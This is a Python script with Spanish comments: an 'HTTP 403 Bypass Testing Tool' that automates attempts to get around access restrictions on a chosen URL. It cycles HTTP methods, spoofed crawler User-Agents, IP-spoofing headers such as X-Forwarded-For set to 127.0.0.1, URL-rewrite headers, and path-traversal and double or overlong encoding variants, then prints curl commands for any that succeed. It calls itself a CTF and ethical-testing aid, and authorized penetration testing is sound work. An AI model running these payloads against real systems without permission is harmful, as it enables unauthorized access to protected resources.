#!/usr/bin/env python3
"""
HTTP 403 Bypass Testing Tool - Versión Mejorada
Para uso en CTFs y testing ético de seguridad
"""

import requests
import argparse
from urllib.parse import urlparse, quote
import time
import sys
from time import sleep
import json
from collections import defaultdict
import concurrent.futures
import base64
import os
from threading import Lock

try:
    import socks
    import socket
    from urllib3.contrib.socks import SOCKSProxyManager
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

# Variables globales para manejo de resultados thread-safe
results_by_code = defaultdict(list)
successful_requests = []
results_lock = Lock()
rate_limit_lock = Lock()  # Añadir esta línea

# Variables de configuración global
global_config = {
    'timeout': 10,
    'proxy': None,
    'auth_header': None,
    'custom_headers': [],
    'custom_methods': [],
    'custom_paths': [],
    'baseline_200_size': None,
    'rate_limit': None,
    'last_request_time': 0,
    'session': None  # Añadir esta línea
}

def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════╗
║                HTTP 403 Bypass Testing Tool                   ║
║              Para CTFs y Testing Ético - v2.0                 ║
╚═══════════════════════════════════════════════════════════════╝
{Colors.END}
    """
    print(banner)

def load_custom_payloads(headers_file=None, methods_file=None, paths_file=None):
    """Carga payloads personalizados desde archivos"""
    # Cargar headers personalizados (JSON)
    if headers_file and os.path.exists(headers_file):
        try:
            with open(headers_file, 'r', encoding='utf-8') as f:
                custom_headers = json.load(f)
                if isinstance(custom_headers, list):
                    global_config['custom_headers'] = custom_headers
                    print(f"{Colors.GREEN}✓ Cargados {len(custom_headers)} headers personalizados{Colors.END}")
                else:
                    print(f"{Colors.YELLOW}⚠ Formato de headers inválido, debe ser una lista{Colors.END}")
        except json.JSONDecodeError:
            print(f"{Colors.RED}✗ Error al parsear archivo de headers JSON{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}✗ Error cargando headers: {str(e)}{Colors.END}")
    
    # Cargar métodos personalizados (texto plano)
    if methods_file and os.path.exists(methods_file):
        try:
            with open(methods_file, 'r', encoding='utf-8') as f:
                custom_methods = [line.strip().upper() for line in f if line.strip()]
                global_config['custom_methods'] = custom_methods
                print(f"{Colors.GREEN}✓ Cargados {len(custom_methods)} métodos personalizados{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}✗ Error cargando métodos: {str(e)}{Colors.END}")
    
    # Cargar rutas personalizadas (texto plano)
    if paths_file and os.path.exists(paths_file):
        try:
            with open(paths_file, 'r', encoding='utf-8') as f:
                custom_paths = [line.strip() for line in f if line.strip()]
                global_config['custom_paths'] = custom_paths
                print(f"{Colors.GREEN}✓ Cargadas {len(custom_paths)} rutas personalizadas{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}✗ Error cargando rutas: {str(e)}{Colors.END}")

def setup_auth_header(auth_string):
    """Configura header de autenticación"""
    if not auth_string:
        return
    
    if auth_string.startswith('Bearer '):
        # Token Bearer
        global_config['auth_header'] = {'Authorization': auth_string}
        print(f"{Colors.GREEN}✓ Configurado Bearer token{Colors.END}")
    elif ':' in auth_string:
        # Autenticación básica usuario:contraseña
        credentials = base64.b64encode(auth_string.encode()).decode()
        global_config['auth_header'] = {'Authorization': f'Basic {credentials}'}
        print(f"{Colors.GREEN}✓ Configurada autenticación básica{Colors.END}")
    else:
        # Asumir que es un token sin Bearer
        global_config['auth_header'] = {'Authorization': f'Bearer {auth_string}'}
        print(f"{Colors.GREEN}✓ Configurado token como Bearer{Colors.END}")

def setup_proxy_session():
    """Configura una sesión con proxy SOCKS si es necesario"""
    if not global_config['proxy']:
        return requests.Session()
    
    proxy_url = global_config['proxy']
    session = requests.Session()
    
    # Detectar tipo de proxy
    if proxy_url.startswith(('socks4://', 'socks5://')):
        if not SOCKS_AVAILABLE:
            print(f"{Colors.RED}❌ Para usar proxies SOCKS instala: pip install requests[socks]{Colors.END}")
            sys.exit(1)
        
        # Configurar proxy SOCKS
        session.proxies = {
            'http': proxy_url,
            'https': proxy_url
        }
        print(f"{Colors.GREEN}✓ Configurado proxy SOCKS: {proxy_url}{Colors.END}")
    
    elif proxy_url.startswith(('http://', 'https://')):
        # Proxy HTTP estándar
        session.proxies = {
            'http': proxy_url,
            'https': proxy_url
        }
        print(f"{Colors.GREEN}✓ Configurado proxy HTTP: {proxy_url}{Colors.END}")
    
    else:
        print(f"{Colors.YELLOW}⚠ Formato de proxy no reconocido, asumiendo HTTP: {proxy_url}{Colors.END}")
        session.proxies = {
            'http': f'http://{proxy_url}',
            'https': f'http://{proxy_url}'
        }
    
    return session

def test_request(url, method='GET', headers=None, data=None):
    """Realiza una petición HTTP y retorna el código de estado"""
    # Aplicar rate limiting si está configurado
    if global_config['rate_limit']:
        with rate_limit_lock:
            current_time = time.time()
            time_since_last = current_time - global_config['last_request_time']
            min_interval = 1.0 / global_config['rate_limit']
            
            if time_since_last < min_interval:
                sleep_time = min_interval - time_since_last
                sleep(sleep_time)
            
            global_config['last_request_time'] = time.time()
    
    try:
        if headers is None:
            headers = {}
        
        # Agregar header de autenticación si está configurado
        if global_config['auth_header']:
            headers.update(global_config['auth_header'])
        
        # Usar la sesión configurada (con o sin proxy)
        session = global_config['session'] or requests.Session()
        
        response = session.request(
            method=method,
            url=url,
            headers=headers,
            data=data,
            timeout=global_config['timeout'],
            allow_redirects=False,
            verify=True
        )
        return response.status_code, len(response.content), response.headers.get('Content-Type', '')
    except requests.exceptions.RequestException as e:
        return f"Error: {str(e)}", 0, ""

def generate_curl_command(url, method='GET', headers=None):
    """Genera comando curl equivalente"""
    curl_cmd = f"curl -X {method}"
    
    if headers:
        for key, value in headers.items():
            curl_cmd += f" -H '{key}: {value}'"
    
    if global_config['proxy']:
        curl_cmd += f" --proxy {global_config['proxy']}"
    
    curl_cmd += f" '{url}'"
    return curl_cmd

def store_result(technique, url, method, headers, status_code, content_length, content_type):
    """Almacena resultado para posterior análisis (thread-safe)"""
    result = {
        'technique': technique,
        'url': url,
        'method': method,
        'headers': headers or {},
        'status_code': status_code,
        'content_length': content_length,
        'content_type': content_type,
        'curl_command': generate_curl_command(url, method, headers),
        'potential_bypass': False
    }
    
    # Detectar posibles bypasses por tamaño de contenido
    if (isinstance(status_code, int) and status_code != 200 and 
        global_config['baseline_200_size'] and 
        content_length == global_config['baseline_200_size']):
        result['potential_bypass'] = True
    
    with results_lock:
        if isinstance(status_code, int):
            results_by_code[status_code].append(result)
            
            # Guardar peticiones exitosas
            if status_code == 200:
                successful_requests.append(result)

def print_live_result(technique, url, status_code, content_length):
    """Imprime resultado en tiempo real (versión compacta)"""
    bypass_indicator = ""
    
    # Verificar si es un posible bypass por tamaño
    if (isinstance(status_code, int) and status_code != 200 and 
        global_config['baseline_200_size'] and 
        content_length == global_config['baseline_200_size']):
        bypass_indicator = f" {Colors.YELLOW}[BYPASS?]{Colors.END}"
    
    if isinstance(status_code, str):  # Es un error
        symbol = "✗"
        color = Colors.RED
    elif status_code == 200:
        symbol = "✓"
        color = f"{Colors.GREEN}{Colors.BOLD}"
    elif status_code in [301, 302, 307, 308]:
        symbol = "↳"
        color = Colors.YELLOW
    elif status_code == 403:
        symbol = "⚠"
        color = Colors.RED
    elif status_code == 404:
        symbol = "?"
        color = Colors.BLUE
    else:
        symbol = "•"
        color = Colors.WHITE
    
    # Truncar técnica si es muy larga
    technique_short = technique[:25] + "..." if len(technique) > 28 else technique
    
    print(f"{color}{symbol} {technique_short:<28} | {status_code}{Colors.END}{bypass_indicator}")

def generate_user_agents():
    """Genera lista de User-Agents comunes"""
    return [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        "curl/7.68.0",
        ""
    ]

def generate_bypass_headers(target_url=None):
    """Genera headers comunes para bypass incluyendo nuevas técnicas"""
    headers = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Forwarded-Host": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Remote-Addr": "127.0.0.1"},
        {"X-ProxyUser-Ip": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Original-URL": "/"},
        {"X-Rewrite-URL": "/"},
        {"Referer": "https://google.com"},
        {"Origin": "https://google.com"},
        {"X-Forwarded-Proto": "https"},
        {"X-Forwarded-Port": "443"},
        {"X-Forwarded-Ssl": "on"},
        {"Host": "localhost"},
        # Nuevas técnicas de bypass
        {"X-HTTP-Method-Override": "GET"},
        {"X-Original-Method": "GET"},
        {"X-Method-Override": "GET"},
        {"X-Host": "127.0.0.1"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Forwarded-By": "127.0.0.1"},
        {"X-Forwarded-For-Original": "127.0.0.1"},
        {"X-Cluster-Client-IP": "127.0.0.1"},
        {"X-True-Client-IP": "127.0.0.1"},
        {"CF-Connecting-IP": "127.0.0.1"},
        {"X-Forwarded": "127.0.0.1"},
        {"Forwarded-For": "127.0.0.1"},
        {"Forwarded": "for=127.0.0.1"},
        {"X-Original-Host": "localhost"},
        {"X-Requested-With": "XMLHttpRequest"},
        {"X-Frame-Options": "SAMEORIGIN"},
        {"X-Content-Type-Options": "nosniff"}
    ]
    
    # Agregar referrer como la propia web si se proporciona la URL
    if target_url:
        parsed_url = urlparse(target_url)
        base_domain = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        # Diferentes variaciones del referrer con la propia web
        self_referrers = [
            {"Referer": base_domain},
            {"Referer": f"{base_domain}/"},
            {"Referer": f"{base_domain}/index.html"},
            {"Referer": f"{base_domain}/home"},
            {"Referer": f"{base_domain}/login"},
            {"Origin": base_domain}
        ]
        
        headers.extend(self_referrers)
    
    # Agregar headers personalizados si existen
    if global_config['custom_headers']:
        headers.extend(global_config['custom_headers'])
    
    return headers

def generate_path_variations(original_path):
    """Genera variaciones del path para bypass incluyendo codificaciones dobles"""
    if not original_path or original_path == "/":
        original_path = "/"
    
    # Asegurarse de que el path comience con /
    if not original_path.startswith('/'):
        original_path = '/' + original_path
    
    variations = [
        original_path,
        original_path + "/",
        original_path + "/.",
        original_path + "//",
        original_path + "///",
        original_path + "/..",
        original_path + "/./",
        original_path + "/../",
        original_path + "/.;/",
        original_path + "/..;/",
        original_path + "?",
        original_path + "#",
        original_path + " ",
        original_path + "%20",
        original_path.upper(),
        original_path.lower(),
        # URL encoding variations - aplicar correctamente
        quote(original_path, safe=''),
        original_path.replace('/', '%2f'),
        original_path.replace('/', '//'),
        # Variaciones con puntos codificados
        original_path.replace('.', '%2e'),
        original_path + '/%2e%2e/',
        original_path + '/%2f%2e%2e%2f',
        # Nuevas codificaciones dobles
        original_path.replace('/', '%252f'),
        original_path.replace('.', '%252e'),
        original_path + '/%252e%252e/',
        original_path.replace('/', '%c0%af'),
        original_path + '/%c0%ae%c0%ae/',
        # Codificaciones Unicode
        original_path.replace('/', '%ef%bc%8f'),
        original_path.replace('.', '%ef%bc%8e')
    ]
    
    # Agregar rutas personalizadas si existen
    if global_config['custom_paths']:
        variations.extend(global_config['custom_paths'])
    
    return list(set(variations))  # Eliminar duplicados

def test_single_request(args):
    """Función auxiliar para pruebas paralelas"""
    technique, url, method, headers = args
    status_code, content_length, content_type = test_request(url, method=method, headers=headers)
    print_live_result(technique, url, status_code, content_length)
    store_result(technique, url, method, headers, status_code, content_length, content_type)
    return (technique, status_code, content_length)

def test_http_methods(base_url, max_workers=5):
    """Prueba diferentes métodos HTTP con paralelización"""
    methods = ['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'PATCH', 'DELETE', 'TRACE']
    
    # Agregar métodos personalizados si existen
    if global_config['custom_methods']:
        methods.extend(global_config['custom_methods'])
        methods = list(set(methods))  # Eliminar duplicados
    
    print(f"\n{Colors.PURPLE}{Colors.BOLD}[1/5] Probando Métodos HTTP ({len(methods)} métodos){Colors.END}")
    print(f"{Colors.CYAN}{'Técnica':<30} | Status{Colors.END}")
    print("─" * 45)
    
    tasks = []
    for method in methods:
        technique = f"Método {method}"
        tasks.append((technique, base_url, method, None))
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        list(executor.map(test_single_request, tasks))

def test_user_agents(base_url, max_workers=5):
    """Prueba diferentes User-Agents con paralelización"""
    user_agents = generate_user_agents()
    
    print(f"\n{Colors.PURPLE}{Colors.BOLD}[2/5] Probando User-Agents{Colors.END}")
    print(f"{Colors.CYAN}{'Técnica':<30} | Status{Colors.END}")
    print("─" * 45)
    
    tasks = []
    for i, ua in enumerate(user_agents):
        headers = {"User-Agent": ua} if ua else {}
        technique = f"UA-{i+1}" if ua else "Sin User-Agent"
        tasks.append((technique, base_url, 'GET', headers))
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        list(executor.map(test_single_request, tasks))

def test_bypass_headers(base_url, max_workers=5):
    """Prueba headers de bypass con paralelización"""
    bypass_headers = generate_bypass_headers(base_url)
    
    print(f"\n{Colors.PURPLE}{Colors.BOLD}[3/5] Probando Headers de Bypass ({len(bypass_headers)} headers){Colors.END}")
    print(f"{Colors.CYAN}{'Técnica':<30} | Status{Colors.END}")
    print("─" * 45)
    
    tasks = []
    for headers in bypass_headers:
        header_name = list(headers.keys())[0]
        header_value = list(headers.values())[0]
        
        # Para mostrar mejor los referrers propios
        if header_name in ["Referer", "Origin"] and base_url in str(header_value):
            technique = f"{header_name} (Self)"
        else:
            technique = f"Header {header_name}"
        
        tasks.append((technique, base_url, 'GET', headers))
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        list(executor.map(test_single_request, tasks))

def test_path_variations(base_url, max_workers=5):
    """Prueba variaciones del path con paralelización"""
    parsed_url = urlparse(base_url)
    base_without_path = f"{parsed_url.scheme}://{parsed_url.netloc}"
    original_path = parsed_url.path if parsed_url.path else "/"
    
    path_variations = generate_path_variations(original_path)
    
    print(f"\n{Colors.PURPLE}{Colors.BOLD}[4/5] Probando Variaciones de Path ({len(path_variations[:20])} variaciones){Colors.END}")
    print(f"{Colors.CYAN}{'Técnica':<30} | Status{Colors.END}")
    print("─" * 45)
    
    tasks = []
    for path in path_variations[:20]:  # Limitar para no saturar
        try:
            # Si el path ya está codificado o es una variación especial, usarlo directamente
            if path.startswith('/'):
                test_url = base_without_path + path
            else:
                test_url = base_without_path + '/' + path
                
            technique = f"Path: {path[:20]}..." if len(path) > 20 else f"Path: {path}"
            tasks.append((technique, test_url, 'GET', None))
            
        except Exception:
            continue
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        list(executor.map(test_single_request, tasks))

def test_combined_techniques(base_url, max_workers=5):
    """Prueba combinaciones de técnicas con paralelización"""
    print(f"\n{Colors.PURPLE}{Colors.BOLD}[5/5] Probando Técnicas Combinadas{Colors.END}")
    print(f"{Colors.CYAN}{'Técnica':<30} | Status{Colors.END}")
    print("─" * 45)
    
    # Obtener el dominio base para referrers propios
    parsed_url = urlparse(base_url)
    base_domain = f"{parsed_url.scheme}://{parsed_url.netloc}"
    
    combinations = [
        {
            'technique': 'POST + Headers + Self-Ref',
            'method': 'POST',
            'headers': {
                "X-Forwarded-For": "127.0.0.1",
                "User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)",
                "Referer": base_domain
            }
        },
        {
            'technique': 'OPTIONS + Self-Origin',
            'method': 'OPTIONS',
            'headers': {
                "X-Real-IP": "127.0.0.1",
                "Referer": f"{base_domain}/",
                "Origin": base_domain
            }
        },
        {
            'technique': 'Googlebot + Self-Ref',
            'method': 'GET',
            'headers': {
                "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                "Referer": f"{base_domain}/index.html",
                "X-Forwarded-For": "127.0.0.1"
            }
        },
        {
            'technique': 'Method Override + Auth',
            'method': 'POST',
            'headers': {
                "X-HTTP-Method-Override": "GET",
                "X-Forwarded-For": "127.0.0.1",
                "X-Original-Method": "GET"
            }
        },
        {
            'technique': 'Multi-IP Headers',
            'method': 'GET',
            'headers': {
                "X-Forwarded-For": "127.0.0.1",
                "X-Real-IP": "127.0.0.1",
                "X-Client-IP": "127.0.0.1",
                "CF-Connecting-IP": "127.0.0.1"
            }
        }
    ]
    
    tasks = []
    for combo in combinations:
        tasks.append((combo['technique'], base_url, combo['method'], combo['headers']))
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        list(executor.map(test_single_request, tasks))

def establish_baseline(base_url):
    """Establece una línea base para comparación de tamaños"""
    print(f"\n{Colors.PURPLE}{Colors.BOLD}[0/5] Estableciendo Línea Base{Colors.END}")
    
    # Probar con una ruta que probablemente retorne 200
    test_urls = [
        base_url,
        base_url.rstrip('/') + '/',
        base_url.rstrip('/') + '/index.html',
        base_url.rstrip('/') + '/index.php'
    ]
    
    for test_url in test_urls:
        status_code, content_length, content_type = test_request(test_url)
        print(f"Prueba inicial: {test_url} -> {status_code} ({content_length} bytes)")
        store_result("Baseline", test_url, 'GET', None, status_code, content_length, content_type)
        
        if status_code == 200:
            global_config['baseline_200_size'] = content_length
            print(f"{Colors.GREEN}✓ Línea base establecida: {content_length} bytes para 200 OK{Colors.END}")
            break
    
    if not global_config['baseline_200_size']:
        print(f"{Colors.YELLOW}⚠ No se pudo establecer línea base de 200 OK{Colors.END}")

def print_summary():
    """Imprime resumen organizado por códigos de estado"""
    print(f"\n{Colors.BOLD}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.CYAN}                            RESUMEN DE RESULTADOS{Colors.END}")
    print(f"{Colors.BOLD}{'='*80}{Colors.END}")
    
    # Contar posibles bypasses
    potential_bypasses = 0
    with results_lock:
        for code, results in results_by_code.items():
            potential_bypasses += sum(1 for r in results if r.get('potential_bypass', False))
    
    if potential_bypasses > 0:
        print(f"{Colors.YELLOW}{Colors.BOLD}🚨 {potential_bypasses} POSIBLES BYPASSES DETECTADOS (mismo tamaño que 200 OK){Colors.END}")
    
    # Ordenar códigos de estado
    sorted_codes = sorted(results_by_code.keys(), key=lambda x: (isinstance(x, str), x))
    
    for code in sorted_codes:
        results = results_by_code[code]
        count = len(results)
        bypass_count = sum(1 for r in results if r.get('potential_bypass', False))
        
        # Colores según código
        if isinstance(code, str):
            color = Colors.RED
            icon = "❌"
        elif code == 200:
            color = f"{Colors.GREEN}{Colors.BOLD}"
            icon = "✅"
        elif code in [301, 302, 307, 308]:
            color = Colors.YELLOW
            icon = "🔄"
        elif code == 403:
            color = Colors.RED
            icon = "🚫"
        elif code == 404:
            color = Colors.BLUE
            icon = "❓"
        else:
            color = Colors.WHITE
            icon = "ℹ️"
        
        bypass_text = f" ({bypass_count} posibles bypasses)" if bypass_count > 0 else ""
        print(f"\n{color}{icon} Código {code} ({count} resultado{'s' if count != 1 else ''}){bypass_text}{Colors.END}")
        
        # Mostrar algunos ejemplos
        for i, result in enumerate(results[:3]):  # Máximo 3 por código
            technique_short = result['technique'][:40] + "..." if len(result['technique']) > 43 else result['technique']
            bypass_indicator = f" {Colors.YELLOW}[BYPASS?]{Colors.END}" if result.get('potential_bypass', False) else ""
            print(f"   • {technique_short}{bypass_indicator}")
        
        if len(results) > 3:
            print(f"   • ... y {len(results) - 3} más")

def print_successful_requests():
    """Imprime comandos curl para peticiones exitosas"""
    if not successful_requests:
        print(f"\n{Colors.YELLOW}No se encontraron peticiones exitosas (200 OK){Colors.END}")
        return
    
    print(f"\n{Colors.GREEN}{Colors.BOLD}🎉 PETICIONES EXITOSAS (200 OK){Colors.END}")
    print(f"{Colors.GREEN}{'='*80}{Colors.END}")
    
    for i, req in enumerate(successful_requests, 1):
        print(f"\n{Colors.GREEN}{Colors.BOLD}[{i}] {req['technique']}{Colors.END}")
        print(f"{Colors.CYAN}URL:{Colors.END} {req['url']}")
        print(f"{Colors.CYAN}Método:{Colors.END} {req['method']}")
        print(f"{Colors.CYAN}Tamaño:{Colors.END} {req['content_length']} bytes")
        if req['content_type']:
            print(f"{Colors.CYAN}Tipo:{Colors.END} {req['content_type']}")
        print(f"{Colors.YELLOW}Comando curl:{Colors.END}")
        print(f"{Colors.WHITE}{req['curl_command']}{Colors.END}")
        
        if i < len(successful_requests):
            print(f"{Colors.GREEN}{'-'*60}{Colors.END}")

def export_results(filename):
    """Exporta resultados completos a JSON"""
    try:
        export_data = {
            'config': global_config,
            'summary': {
                'total_requests': sum(len(results) for results in results_by_code.values()),
                'successful_requests': len(successful_requests),
                'potential_bypasses': sum(sum(1 for r in results if r.get('potential_bypass', False)) 
                                        for results in results_by_code.values()),
                'codes_found': list(results_by_code.keys())
            },
            'results_by_code': dict(results_by_code),
            'successful_requests': successful_requests
        }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(export_data, f, indent=2, ensure_ascii=False, default=str)
        
        print(f"\n{Colors.GREEN}✅ Resultados exportados a: {filename}{Colors.END}")
        
    except Exception as e:
        print(f"\n{Colors.RED}❌ Error exportando resultados: {str(e)}{Colors.END}")

def main():
    print_banner()
    
    parser = argparse.ArgumentParser(description='HTTP 403 Bypass Testing Tool - v2.0')
    parser.add_argument('-u', '--url', required=True, help='URL objetivo')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Timeout en segundos (default: 10)')
    parser.add_argument('--proxy', help='Proxy HTTP/HTTPS/SOCKS (ej: http://127.0.0.1:8080, socks5://127.0.0.1:1080)')
    parser.add_argument('--auth', help='Autenticación: Bearer token, usuario:contraseña, o token sin Bearer')
    parser.add_argument('--threads', type=int, default=5, help='Número de hilos para pruebas paralelas (default: 5)')
    parser.add_argument('--rate-limit', type=float, help='Límite de peticiones por segundo (ej: 2.5 para 2.5 req/s)')  # Añadir esta línea
    parser.add_argument('--headers-file', help='Archivo JSON con headers personalizados')
    parser.add_argument('--methods-file', help='Archivo texto con métodos HTTP personalizados')
    parser.add_argument('--paths-file', help='Archivo texto con rutas personalizadas')
    parser.add_argument('--export', help='Exportar resultados a archivo JSON')
    parser.add_argument('-f', '--filter', type=int, help='Filtrar resultados por código de estado')
    parser.add_argument('--show-all', action='store_true', help='Mostrar todos los resultados detallados')

    args = parser.parse_args()
    
    # Configurar parámetros globales
    # Configurar parámetros globales
    global_config['timeout'] = args.timeout
    global_config['proxy'] = args.proxy
    
    # Configurar sesión con proxy
    global_config['session'] = setup_proxy_session()
    
    # Configurar rate limiting
    if args.rate_limit:
        if args.rate_limit <= 0:
            print(f"{Colors.RED}❌ El rate limit debe ser mayor que 0{Colors.END}")
            sys.exit(1)
        global_config['rate_limit'] = args.rate_limit
        print(f"{Colors.CYAN}⏱️  Rate limit: {args.rate_limit} peticiones/segundo{Colors.END}")
    
    # Configurar autenticación
    if args.auth:
        setup_auth_header(args.auth)
    
    # Cargar payloads personalizados
    load_custom_payloads(args.headers_file, args.methods_file, args.paths_file)
    
    target_url = args.url
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    print(f"\n{Colors.BOLD}🎯 Objetivo: {target_url}{Colors.END}")
    if args.proxy:
        print(f"{Colors.CYAN}🔗 Proxy: {args.proxy}{Colors.END}")
    if global_config['auth_header']:
        print(f"{Colors.CYAN}🔐 Autenticación: Configurada{Colors.END}")
    print(f"{Colors.CYAN}⚡ Hilos: {args.threads}{Colors.END}")
    print(f"{Colors.YELLOW}⚡ Iniciando escaneo de bypass 403...{Colors.END}")
    
    # Establecer línea base
    establish_baseline(target_url)
    
    # Ejecutar todas las pruebas con paralelización
    test_http_methods(target_url, args.threads)
    test_user_agents(target_url, args.threads)
    test_bypass_headers(target_url, args.threads)
    test_path_variations(target_url, args.threads)
    test_combined_techniques(target_url, args.threads)
    
    # Mostrar resultados
    if args.filter:
        print_filtered_results(args.filter)
    else:
        print_summary()
        print_successful_requests()
    
    if args.show_all:
        print(f"\n{Colors.BOLD}TODOS LOS RESULTADOS DETALLADOS{Colors.END}")
        for code in sorted(results_by_code.keys(), key=lambda x: (isinstance(x, str), x)):
            print_filtered_results(code)
    
    # Exportar resultados si se solicita
    if args.export:
        export_results(args.export)
    
    print(f"\n{Colors.GREEN}{Colors.BOLD}✅ Escaneo completado!{Colors.END}")
    print(f"{Colors.CYAN}💡 Usa --filter [código] para ver detalles de un código específico{Colors.END}")
    print(f"{Colors.CYAN}💡 Usa --export results.json para guardar resultados completos{Colors.END}")

def print_filtered_results(filter_code):
    """Imprime resultados filtrados por código de estado"""
    if filter_code not in results_by_code:
        print(f"\n{Colors.YELLOW}No se encontraron resultados con código {filter_code}{Colors.END}")
        return
    
    results = results_by_code[filter_code]
    potential_bypasses = [r for r in results if r.get('potential_bypass', False)]
    
    print(f"\n{Colors.BOLD}RESULTADOS CON CÓDIGO {filter_code} ({len(results)} encontrados){Colors.END}")
    if potential_bypasses:
        print(f"{Colors.YELLOW}🚨 {len(potential_bypasses)} posibles bypasses detectados{Colors.END}")
    print("="*80)
    
    for i, result in enumerate(results, 1):
        bypass_indicator = f" {Colors.YELLOW}[POSIBLE BYPASS]{Colors.END}" if result.get('potential_bypass', False) else ""
        print(f"\n{Colors.BOLD}[{i}] {result['technique']}{Colors.END}{bypass_indicator}")
        print(f"URL: {result['url']}")
        print(f"Método: {result['method']}")
        print(f"Headers: {json.dumps(result['headers'], indent=2) if result['headers'] else 'Ninguno'}")
        print(f"Tamaño: {result['content_length']} bytes")
        if result['content_type']:
            print(f"Tipo: {result['content_type']}")
        print(f"Curl: {result['curl_command']}")
        if i < len(results):
            print("-" * 60)


if __name__ == '__main__':
    main()